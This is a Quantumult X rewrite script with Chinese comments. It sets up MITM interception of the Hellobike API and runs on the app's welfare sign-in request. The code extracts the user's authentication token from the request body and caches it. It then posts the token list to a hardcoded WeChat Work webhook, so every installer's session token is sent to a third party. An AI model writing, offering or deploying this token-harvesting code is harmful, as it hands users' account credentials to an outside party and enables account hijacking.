/*
windows 命令窗口 输入 python -m http.server 8080
不要关掉！！！
===================

[rewrite_local]
^https?:\/\/api\.hellobike\.com\/api\?common\.welfare\.signAndRecommend$ url script-request-body https://raw.githubusercontent.com/fengyunjay2004/Lexus/refs/heads/main/hellobike.js

[mitm]
hostname = api.hellobike.com
===================
*/

if ($request) {
    let body = $request.body;  // 获取请求体
    let url = $request.url;

    // 定义10分钟的毫秒数
    const TEN_MINUTES = 10 * 60 * 1000;

    // 获取当前时间
    let currentTime = new Date().getTime();

    // 从本地缓存中获取 token 列表和对应的时间戳
    let cachedTokens = JSON.parse($prefs.valueForKey("tokenList") || "[]");  // 获取 token 列表，默认空数组
    let lastSavedTime = $prefs.valueForKey("tokenTime");

    // 清理过期的 token
    cachedTokens = cachedTokens.filter(item => currentTime - item.timestamp < TEN_MINUTES);

    // 更新缓存
    $prefs.setValueForKey(JSON.stringify(cachedTokens), "tokenList");
    $prefs.setValueForKey(currentTime, "tokenTime");

    // 检查是否为获取用户信息的请求
    if (url.indexOf("https://api.hellobike.com/api?common.welfare.signAndRecommend") !== -1) {
        // 提取请求体中的 token
        let tokenMatch = body.match(/"token":"([^"]+)"/);

        if (tokenMatch) {
            let newToken = tokenMatch[1];  // 获取当前 token 值

            // 判断新 token 是否已经存在
            let existingToken = cachedTokens.find(item => item.token === newToken);

            if (!existingToken) {
                // 如果 token 不存在，添加新的 token 和时间戳到缓存
                cachedTokens.push({
                    token: newToken,
                    timestamp: currentTime
                });

                $prefs.setValueForKey(JSON.stringify(cachedTokens), "tokenList");
                console.log(`Hellobike新Token添加成功: ${newToken}`);
            } else {
                console.log("抓取到的 Token 已存在，跳过保存");
            }

            // 发送当前的 Token 缓存
            sendCurrentTokenCache(cachedTokens);
        } else {
            $notify("失败", "未找到 Token", "请检查请求体");
            $done();  // 未找到 token 时调用 $done()
        }
    } else {
        $done();  // URL 不匹配时调用 $done()
    }
}

// 函数用于发送当前Token缓存的消息
function sendCurrentTokenCache(tokens) {
    let wechatWebhookUrl = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=284b000b-784b-40b4-8a4a-893f4ab3b4b8";
    let wechatMessage = {
        "msgtype": "text",
        "text": {
            "content": `Hellobike当前Token缓存：\n\n${tokens.map(item => `${item.token}`).join("@")}`
        }
    };

    let options = {
        url: wechatWebhookUrl,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(wechatMessage)
    };

    $task.fetch(options).then(response => {
        console.log(`Token缓存消息发送成功: ${response.body}`);
        $done();  // 完成
    }, reason => {
        console.log(`Token缓存消息发送失败: ${reason.error}`);
        $done();  // 在消息发送失败后调用 $done()
    });
}

